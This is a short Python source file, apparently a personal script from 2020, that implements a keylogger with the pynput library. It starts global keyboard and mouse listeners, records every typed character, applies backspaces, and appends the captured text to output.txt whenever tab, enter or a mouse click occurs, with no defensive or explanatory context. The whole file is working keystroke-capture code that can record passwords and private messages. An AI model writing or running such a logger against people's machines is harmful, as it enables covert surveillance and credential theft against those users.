# -*- coding: utf-8 -*-
"""
Created on Sat Aug 29 17:37:04 2020

@author: OHyic
"""

import os
from pynput import mouse
from pynput import keyboard


def on_press(key):
    global text
    try:
        print('[INFO] alphanumeric key %s pressed'%(key.char))
        text +=str(key.char)
    except AttributeError:
        print('[INFO] special key %s pressed'%(key))
        if str(key) in ["Key.tab","Key.enter"]:
            print("write into file")
            write_to_text (file_name="output.txt")
        elif str(key) == "Key.space":
            text +=" "
        elif str(key) == "Key.backspace":
            text = text[:-1]
       
def on_click(x, y, button, pressed):
    if pressed:
        print('[INFO] mouse click at (%d,%d)'%(x, y))
        write_to_text (file_name="output.txt")

def write_to_text (file_name="output.txt"):
    global text
    #if file not exists, create new file
    if text != "":
        if(not os.path.isfile(file_name)):
            print("[INFO] New file created")
            f = open(file_name, 'x') 
            f.close() 

        try:
            #write into file
            f = open(file_name, 'a') 
            keylogs = text + '\n'
            print(keylogs)
            f.write(keylogs)
            f.close() 
            #clear text
            text=""
        except Exception as e:
            print(e)

text = ""
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()
    